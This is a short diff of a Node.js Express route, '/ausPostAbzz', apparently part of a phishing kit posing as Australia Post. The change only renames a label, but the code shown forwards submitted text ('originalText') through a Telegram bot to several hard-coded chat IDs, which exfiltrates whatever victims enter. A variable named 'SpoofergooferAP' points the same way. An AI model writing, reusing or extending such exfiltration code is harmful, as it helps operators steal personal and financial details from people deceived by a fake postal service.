@@ -399,7 +399,7 @@ app.post("/ausPostAbzz", (req, res) => {
         SpoofergooferAP = 0;
       } else {
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostManny:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostAbzz:\n${originalText}`
         );
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1016584597&text=AusPost:\n${originalText}`
